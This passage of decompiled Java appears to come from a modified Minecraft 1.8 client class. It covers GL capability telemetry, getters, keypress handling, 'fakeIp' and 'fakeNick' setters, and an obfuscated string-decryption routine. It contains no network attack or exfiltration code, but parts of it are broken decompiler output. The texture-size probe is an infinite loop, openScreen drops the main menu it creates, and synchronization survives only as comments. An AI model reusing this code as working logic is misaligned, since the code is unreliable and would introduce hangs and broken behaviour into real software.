        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_depth_clamp]", capabilities.GL_ARB_depth_clamp);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_depth_texture]", capabilities.GL_ARB_depth_texture);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_draw_buffers]", capabilities.GL_ARB_draw_buffers);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_draw_buffers_blend]", capabilities.GL_ARB_draw_buffers_blend);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_draw_elements_base_vertex]", capabilities.GL_ARB_draw_elements_base_vertex);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_draw_indirect]", capabilities.GL_ARB_draw_indirect);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_draw_instanced]", capabilities.GL_ARB_draw_instanced);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_explicit_attrib_location]", capabilities.GL_ARB_explicit_attrib_location);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_explicit_uniform_location]", capabilities.GL_ARB_explicit_uniform_location);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_fragment_layer_viewport]", capabilities.GL_ARB_fragment_layer_viewport);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_fragment_program]", capabilities.GL_ARB_fragment_program);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_fragment_shader]", capabilities.GL_ARB_fragment_shader);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_fragment_program_shadow]", capabilities.GL_ARB_fragment_program_shadow);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_framebuffer_object]", capabilities.GL_ARB_framebuffer_object);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_framebuffer_sRGB]", capabilities.GL_ARB_framebuffer_sRGB);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_geometry_shader4]", capabilities.GL_ARB_geometry_shader4);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_gpu_shader5]", capabilities.GL_ARB_gpu_shader5);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_half_float_pixel]", capabilities.GL_ARB_half_float_pixel);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_half_float_vertex]", capabilities.GL_ARB_half_float_vertex);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_instanced_arrays]", capabilities.GL_ARB_instanced_arrays);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_map_buffer_alignment]", capabilities.GL_ARB_map_buffer_alignment);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_map_buffer_range]", capabilities.GL_ARB_map_buffer_range);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_multisample]", capabilities.GL_ARB_multisample);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_multitexture]", capabilities.GL_ARB_multitexture);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_occlusion_query2]", capabilities.GL_ARB_occlusion_query2);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_pixel_buffer_object]", capabilities.GL_ARB_pixel_buffer_object);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_seamless_cube_map]", capabilities.GL_ARB_seamless_cube_map);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_shader_objects]", capabilities.GL_ARB_shader_objects);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_shader_stencil_export]", capabilities.GL_ARB_shader_stencil_export);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_shader_texture_lod]", capabilities.GL_ARB_shader_texture_lod);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_shadow]", capabilities.GL_ARB_shadow);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_shadow_ambient]", capabilities.GL_ARB_shadow_ambient);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_stencil_texturing]", capabilities.GL_ARB_stencil_texturing);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_sync]", capabilities.GL_ARB_sync);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_tessellation_shader]", capabilities.GL_ARB_tessellation_shader);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_texture_border_clamp]", capabilities.GL_ARB_texture_border_clamp);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_texture_buffer_object]", capabilities.GL_ARB_texture_buffer_object);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_texture_cube_map]", capabilities.GL_ARB_texture_cube_map);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_texture_cube_map_array]", capabilities.GL_ARB_texture_cube_map_array);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_texture_non_power_of_two]", capabilities.GL_ARB_texture_non_power_of_two);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_uniform_buffer_object]", capabilities.GL_ARB_uniform_buffer_object);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_vertex_blend]", capabilities.GL_ARB_vertex_blend);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_vertex_buffer_object]", capabilities.GL_ARB_vertex_buffer_object);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_vertex_program]", capabilities.GL_ARB_vertex_program);
        playerUsageSnooper.addStatToSnooper("gl_caps[ARB_vertex_shader]", capabilities.GL_ARB_vertex_shader);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_bindable_uniform]", capabilities.GL_EXT_bindable_uniform);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_blend_equation_separate]", capabilities.GL_EXT_blend_equation_separate);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_blend_func_separate]", capabilities.GL_EXT_blend_func_separate);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_blend_minmax]", capabilities.GL_EXT_blend_minmax);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_blend_subtract]", capabilities.GL_EXT_blend_subtract);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_draw_instanced]", capabilities.GL_EXT_draw_instanced);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_framebuffer_multisample]", capabilities.GL_EXT_framebuffer_multisample);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_framebuffer_object]", capabilities.GL_EXT_framebuffer_object);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_framebuffer_sRGB]", capabilities.GL_EXT_framebuffer_sRGB);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_geometry_shader4]", capabilities.GL_EXT_geometry_shader4);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_gpu_program_parameters]", capabilities.GL_EXT_gpu_program_parameters);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_gpu_shader4]", capabilities.GL_EXT_gpu_shader4);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_multi_draw_arrays]", capabilities.GL_EXT_multi_draw_arrays);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_packed_depth_stencil]", capabilities.GL_EXT_packed_depth_stencil);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_paletted_texture]", capabilities.GL_EXT_paletted_texture);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_rescale_normal]", capabilities.GL_EXT_rescale_normal);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_separate_shader_objects]", capabilities.GL_EXT_separate_shader_objects);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_shader_image_load_store]", capabilities.GL_EXT_shader_image_load_store);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_shadow_funcs]", capabilities.GL_EXT_shadow_funcs);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_shared_texture_palette]", capabilities.GL_EXT_shared_texture_palette);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_stencil_clear_tag]", capabilities.GL_EXT_stencil_clear_tag);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_stencil_two_side]", capabilities.GL_EXT_stencil_two_side);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_stencil_wrap]", capabilities.GL_EXT_stencil_wrap);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_texture_3d]", capabilities.GL_EXT_texture_3d);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_texture_array]", capabilities.GL_EXT_texture_array);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_texture_buffer_object]", capabilities.GL_EXT_texture_buffer_object);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_texture_integer]", capabilities.GL_EXT_texture_integer);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_texture_lod_bias]", capabilities.GL_EXT_texture_lod_bias);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_texture_sRGB]", capabilities.GL_EXT_texture_sRGB);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_vertex_shader]", capabilities.GL_EXT_vertex_shader);
        playerUsageSnooper.addStatToSnooper("gl_caps[EXT_vertex_weighting]", capabilities.GL_EXT_vertex_weighting);
        playerUsageSnooper.addStatToSnooper("gl_caps[gl_max_vertex_uniforms]", GL11.glGetInteger(35658));
        GL11.glGetError();
        playerUsageSnooper.addStatToSnooper("gl_caps[gl_max_fragment_uniforms]", GL11.glGetInteger(35657));
        GL11.glGetError();
        playerUsageSnooper.addStatToSnooper("gl_caps[gl_max_vertex_attribs]", GL11.glGetInteger(34921));
        GL11.glGetError();
        playerUsageSnooper.addStatToSnooper("gl_caps[gl_max_vertex_texture_image_units]", GL11.glGetInteger(35660));
        GL11.glGetError();
        playerUsageSnooper.addStatToSnooper("gl_caps[gl_max_texture_image_units]", GL11.glGetInteger(34930));
        GL11.glGetError();
        playerUsageSnooper.addStatToSnooper("gl_caps[gl_max_texture_image_units]", GL11.glGetInteger(35071));
        GL11.glGetError();
        playerUsageSnooper.addStatToSnooper("gl_max_texture_size", getGLMaximumTextureSize());
    }
    
    public static int getGLMaximumTextureSize() {
        while (16384 > 0) {
            GL11.glTexImage2D(32868, 0, 6408, 16384, 16384, 0, 6408, 5121, (ByteBuffer)null);
            if (GL11.glGetTexLevelParameteri(32868, 0, 4096) != 0) {
                return 16384;
            }
        }
        return -1;
    }
    
    @Override
    public boolean isSnooperEnabled() {
        return this.gameSettings.snooperEnabled;
    }
    
    public void setServerData(final ServerData currentServerData) {
        this.currentServerData = currentServerData;
    }
    
    public ServerData getCurrentServerData() {
        return this.currentServerData;
    }
    
    public boolean isIntegratedServerRunning() {
        return this.integratedServerIsRunning;
    }
    
    public boolean isSingleplayer() {
        return this.integratedServerIsRunning && this.theIntegratedServer != null;
    }
    
    public IntegratedServer getIntegratedServer() {
        return this.theIntegratedServer;
    }
    
    public static void stopIntegratedServer() {
        if (Minecraft.theMinecraft != null) {
            final IntegratedServer integratedServer = Minecraft.theMinecraft.getIntegratedServer();
            if (integratedServer != null) {
                integratedServer.stopServer();
            }
        }
    }
    
    public PlayerUsageSnooper getPlayerUsageSnooper() {
        return this.usageSnooper;
    }
    
    public static long getSystemTime() {
        return Sys.getTime() * 1000L / Sys.getTimerResolution();
    }
    
    public boolean isFullScreen() {
        return this.fullscreen;
    }
    
    public static Session getSession() {
        return Minecraft.session;
    }
    
    public PropertyMap func_180509_L() {
        return this.twitchDetails;
    }
    
    public Proxy getProxy() {
        return this.proxy;
    }
    
    public TextureManager getTextureManager() {
        return this.renderEngine;
    }
    
    public IResourceManager getResourceManager() {
        return this.mcResourceManager;
    }
    
    public ResourcePackRepository getResourcePackRepository() {
        return this.mcResourcePackRepository;
    }
    
    public LanguageManager getLanguageManager() {
        return this.mcLanguageManager;
    }
    
    public TextureMap getTextureMapBlocks() {
        return this.textureMapBlocks;
    }
    
    public boolean isJava64bit() {
        return this.jvm64bit;
    }
    
    public boolean isGamePaused() {
        return this.isGamePaused;
    }
    
    public static SoundHandler getSoundHandler() {
        return Minecraft.mcSoundHandler;
    }
    
    public MusicTicker.MusicType getAmbientMusicType() {
        return (this.currentScreen instanceof GuiWinGame) ? MusicTicker.MusicType.CREDITS : ((Minecraft.thePlayer != null) ? ((Minecraft.thePlayer.worldObj.provider instanceof WorldProviderHell) ? MusicTicker.MusicType.NETHER : ((Minecraft.thePlayer.worldObj.provider instanceof WorldProviderEnd) ? ((BossStatus.bossName != null && BossStatus.statusBarTime > 0) ? MusicTicker.MusicType.END_BOSS : MusicTicker.MusicType.END) : ((Minecraft.thePlayer.capabilities.isCreativeMode && Minecraft.thePlayer.capabilities.allowFlying) ? MusicTicker.MusicType.CREATIVE : MusicTicker.MusicType.GAME))) : MusicTicker.MusicType.MENU);
    }
    
    public IStream getTwitchStream() {
        return this.stream;
    }
    
    public void dispatchKeypresses() {
        final int n = (Keyboard.getEventKey() == 0) ? Keyboard.getEventCharacter() : Keyboard.getEventKey();
        if (n != 0 && !Keyboard.isRepeatEvent() && (!(this.currentScreen instanceof GuiControls) || ((GuiControls)this.currentScreen).time <= getSystemTime() - 20L)) {
            if (Keyboard.getEventKeyState()) {
                if (n == this.gameSettings.keyBindStreamStartStop.getKeyCode()) {
                    if (this.getTwitchStream().func_152934_n()) {
                        this.getTwitchStream().func_152914_u();
                    }
                    else if (this.getTwitchStream().func_152924_m()) {
                        this.displayGuiScreen(new GuiYesNo(new GuiYesNoCallback() {
                            private static final String __OBFID;
                            final Minecraft this$0;
                            
                            @Override
                            public void confirmClicked(final boolean b, final int n) {
                                if (b) {
                                    this.this$0.getTwitchStream().func_152930_t();
                                }
                                this.this$0.displayGuiScreen(null);
                            }
                            
                            static {
                                __OBFID = "CL_00001852";
                            }
                        }, I18n.format("stream.confirm_start", new Object[0]), "", 0));
                    }
                    else if (this.getTwitchStream().func_152928_D() && this.getTwitchStream().func_152936_l()) {
                        if (Minecraft.theWorld != null) {
                            Minecraft.ingameGUI.getChatGUI().printChatMessage(new ChatComponentText("Not ready to start streaming yet!"));
                        }
                    }
                    else {
                        GuiStreamUnavailable.func_152321_a(this.currentScreen);
                    }
                }
                else if (n == this.gameSettings.keyBindStreamPauseUnpause.getKeyCode()) {
                    if (this.getTwitchStream().func_152934_n()) {
                        if (this.getTwitchStream().isPaused()) {
                            this.getTwitchStream().func_152933_r();
                        }
                        else {
                            this.getTwitchStream().func_152916_q();
                        }
                    }
                }
                else if (n == this.gameSettings.keyBindStreamCommercials.getKeyCode()) {
                    if (this.getTwitchStream().func_152934_n()) {
                        this.getTwitchStream().func_152931_p();
                    }
                }
                else if (n == this.gameSettings.keyBindStreamToggleMic.getKeyCode()) {
                    this.stream.func_152910_a(true);
                }
                else if (n == this.gameSettings.keyBindFullscreen.getKeyCode()) {
                    this.toggleFullscreen();
                }
                else if (n == this.gameSettings.keyBindScreenshot.getKeyCode()) {
                    Minecraft.ingameGUI.getChatGUI().printChatMessage(ScreenShotHelper.saveScreenshot(Minecraft.mcDataDir, this.displayWidth, this.displayHeight, this.framebufferMc));
                }
            }
            else if (n == this.gameSettings.keyBindStreamToggleMic.getKeyCode()) {
                this.stream.func_152910_a(false);
            }
        }
    }
    
    public MinecraftSessionService getSessionService() {
        return this.sessionService;
    }
    
    public SkinManager getSkinManager() {
        return this.skinManager;
    }
    
    public Entity func_175606_aa() {
        return this.field_175622_Z;
    }
    
    public void func_175607_a(final Entity field_175622_Z) {
        this.field_175622_Z = field_175622_Z;
        this.entityRenderer.func_175066_a(field_175622_Z);
    }
    
    public ListenableFuture addScheduledTask(final Callable callable) {
        Validate.notNull(callable);
        if (!this.isCallingFromMinecraftThread()) {
            final ListenableFutureTask create = ListenableFutureTask.create(callable);
            final Queue scheduledTasks = this.scheduledTasks;
            // monitorenter(scheduledTasks2 = this.scheduledTasks)
            this.scheduledTasks.add(create);
            // monitorexit(scheduledTasks2)
            return create;
        }
        return Futures.immediateFuture(callable.call());
    }
    
    @Override
    public ListenableFuture addScheduledTask(final Runnable runnable) {
        Validate.notNull(runnable);
        return this.addScheduledTask(Executors.callable(runnable));
    }
    
    @Override
    public boolean isCallingFromMinecraftThread() {
        return Thread.currentThread() == this.mcThread;
    }
    
    public BlockRendererDispatcher getBlockRendererDispatcher() {
        return this.field_175618_aM;
    }
    
    public RenderManager getRenderManager() {
        return this.renderManager;
    }
    
    public RenderItem getRenderItem() {
        return this.renderItem;
    }
    
    public ItemRenderer getItemRenderer() {
        return this.itemRenderer;
    }
    
    public static int func_175610_ah() {
        return Minecraft.debugFPS;
    }
    
    public static Map func_175596_ai() {
        final HashMap hashMap2;
        final HashMap hashMap = hashMap2 = Maps.newHashMap();
        final String s = "X-Minecraft-Username";
        getMinecraft();
        hashMap2.put(s, getSession().getUsername());
        final HashMap hashMap3 = hashMap;
        final String s2 = "X-Minecraft-UUID";
        getMinecraft();
        hashMap3.put(s2, getSession().getPlayerID());
        hashMap.put("X-Minecraft-Version", "1.8");
        return hashMap;
    }
    
    public boolean isConnectedToRealms() {
        return this.connectedToRealms;
    }
    
    public String getFakeIp() {
        return this.fakeIp;
    }
    
    public String getFakeNick() {
        return this.fakeNick;
    }
    
    public void setFakeIp(final String fakeIp) {
        this.fakeIp = fakeIp;
    }
    
    public void setFakeNick(final String fakeNick) {
        this.fakeNick = fakeNick;
    }
    
    public static Minecraft getInstance() {
        return Minecraft.theMinecraft;
    }
    
    public String getVersion() {
        return this.launchedVersion;
    }
    
    public void setSession(final Session session) {
        Minecraft.session = session;
    }
    
    public Entity getRenderViewEntity() {
        return this.renderViewEntity;
    }
    
    public static World getWorld() {
        return Minecraft.theWorld;
    }
    
    public static EntityPlayerSP getPlayer() {
        return Minecraft.thePlayer;
    }
    
    public void openScreen(final GuiScreen guiScreen) {
        final Object o = null;
        GuiScreen currentScreen = null;
        if (this.currentScreen != null) {
            this.currentScreen.onGuiClosed();
        }
        if (guiScreen == null && Minecraft.theWorld == null) {
            final GuiMainMenu guiMainMenu = new GuiMainMenu();
        }
        else if (o == null && Minecraft.thePlayer.getHealth() <= 0.0f) {
            currentScreen = new GuiGameOver();
        }
        if ((this.currentScreen = currentScreen) != null) {
            this.setIngameNotInFocus();
            final ScaledResolution scaledResolution = new ScaledResolution(this, this.displayWidth, this.displayHeight);
            currentScreen.setWorldAndResolution(this, ScaledResolution.getScaledWidth(), ScaledResolution.getScaledHeight());
            this.skipRenderWorld = false;
        }
        else {
            Minecraft.mcSoundHandler.resumeSounds();
            this.setIngameFocus();
        }
    }
    
    public static int getDebugFPS() {
        return Minecraft.debugFPS;
    }
    
    static String access$0(final Minecraft minecraft) {
        return minecraft.launchedVersion;
    }
    
    static final class SwitchEnumMinecartType
    {
        static final int[] field_152390_a;
        static final int[] field_178901_b;
        private static final String __OBFID;
        private static final String[] lIlIIIIllIllIlll;
        private static String[] lIlIIIIllIlllIII;
        
        static {
            lllIlllIIIIIlIll();
            lllIlllIIIIIlIlI();
            __OBFID = SwitchEnumMinecartType.lIlIIIIllIllIlll[0];
            field_178901_b = new int[EntityMinecart.EnumMinecartType.values().length];
            try {
                SwitchEnumMinecartType.field_178901_b[EntityMinecart.EnumMinecartType.FURNACE.ordinal()] = 1;
            }
            catch (NoSuchFieldError noSuchFieldError) {}
            try {
                SwitchEnumMinecartType.field_178901_b[EntityMinecart.EnumMinecartType.CHEST.ordinal()] = 2;
            }
            catch (NoSuchFieldError noSuchFieldError2) {}
            try {
                SwitchEnumMinecartType.field_178901_b[EntityMinecart.EnumMinecartType.TNT.ordinal()] = 3;
            }
            catch (NoSuchFieldError noSuchFieldError3) {}
            try {
                SwitchEnumMinecartType.field_178901_b[EntityMinecart.EnumMinecartType.HOPPER.ordinal()] = 4;
            }
            catch (NoSuchFieldError noSuchFieldError4) {}
            try {
                SwitchEnumMinecartType.field_178901_b[EntityMinecart.EnumMinecartType.COMMAND_BLOCK.ordinal()] = 5;
            }
            catch (NoSuchFieldError noSuchFieldError5) {}
            field_152390_a = new int[MovingObjectPosition.MovingObjectType.values().length];
            try {
                SwitchEnumMinecartType.field_152390_a[MovingObjectPosition.MovingObjectType.ENTITY.ordinal()] = 1;
            }
            catch (NoSuchFieldError noSuchFieldError6) {}
            try {
                SwitchEnumMinecartType.field_152390_a[MovingObjectPosition.MovingObjectType.BLOCK.ordinal()] = 2;
            }
            catch (NoSuchFieldError noSuchFieldError7) {}
            try {
                SwitchEnumMinecartType.field_152390_a[MovingObjectPosition.MovingObjectType.MISS.ordinal()] = 3;
            }
            catch (NoSuchFieldError noSuchFieldError8) {}
        }
        
        private static void lllIlllIIIIIlIlI() {
            (lIlIIIIllIllIlll = new String[1])[0] = lllIlllIIIIIlIIl(SwitchEnumMinecartType.lIlIIIIllIlllIII[0], SwitchEnumMinecartType.lIlIIIIllIlllIII[1]);
            SwitchEnumMinecartType.lIlIIIIllIlllIII = null;
        }
        
        private static void lllIlllIIIIIlIll() {
            final String fileName = new Exception().getStackTrace()[0].getFileName();
            SwitchEnumMinecartType.lIlIIIIllIlllIII = fileName.substring(fileName.indexOf("\u00e4") + 1, fileName.lastIndexOf("\u00fc")).split("\u00f6");
        }
        
        private static String lllIlllIIIIIlIIl(final String s, final String s2) {
            try {
                final SecretKeySpec secretKeySpec = new SecretKeySpec(MessageDigest.getInstance("MD5").digest(s2.getBytes(StandardCharsets.UTF_8)), "Blowfish");
                final Cipher instance = Cipher.getInstance("Blowfish");
                instance.init(2, secretKeySpec);
                return new String(instance.doFinal(Base64.getDecoder().decode(s.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
            }
            catch (Exception ex) {
                ex.printStackTrace();
                return null;
            }
        }
    }
}
